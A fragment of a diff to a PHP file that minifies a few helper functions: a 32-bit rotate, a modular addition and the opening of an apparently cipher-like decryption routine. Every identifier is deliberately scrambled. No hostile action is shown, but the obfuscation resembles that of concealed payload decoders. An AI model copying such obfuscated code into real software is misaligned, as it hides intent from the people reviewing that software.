@@ -21,16 +21,11 @@ function JfQoRk($UtLxWp){$QrMuNw=[];$IvWxQz=TeWlQn($UtLxWp);for($RaDfGt=0;$RaDfG
 
 function UrDoPg($PeXwRl,$TiYpZr){$PeXwRl=($PeXwRl+$TiYpZr)%0x100000000;$TiYpZr=($PeXwRl+2*$TiYpZr)%0x100000000;return[$PeXwRl,$TiYpZr];}
 
-function XpSwRt($FbUaYp, $ViWnLy) {
-    return (($FbUaYp << $ViWnLy) & 0xFFFFFFFF) | ($FbUaYp >> (32 - $ViWnLy));
-}
+function XpSwRt($FbUaYp,$ViWnLy){return(($FbUaYp<<$ViWnLy)&0xFFFFFFFF)|($FbUaYp>>(32-$ViWnLy));}
 
-function RtAeUk($QxYoWm, $IaJqRt) {
-    return ($QxYoWm + $IaJqRt) % 0x100000000;
-}
+function RtAeUk($QxYoWm,$IaJqRt){return($QxYoWm+$IaJqRt)%0x100000000;}
 
-function WdYnXp($WmYqRp, $DkEnQz) {
-    $CeJoTs = JfQoRk($DkEnQz);
+function WdYnXp($WmYqRp,$DkEnQz){$CeJoTs=JfQoRk($DkEnQz);
 
     $QjReXy = ord($WmYqRp[0]) | (ord($WmYqRp[1]) << 8) | (ord($WmYqRp[2]) << 16) | (ord($WmYqRp[3]) << 24);
     $MxYsWd = ord($WmYqRp[4]) | (ord($WmYqRp[5]) << 8) | (ord($WmYqRp[6]) << 16) | (ord($WmYqRp[7]) << 24);
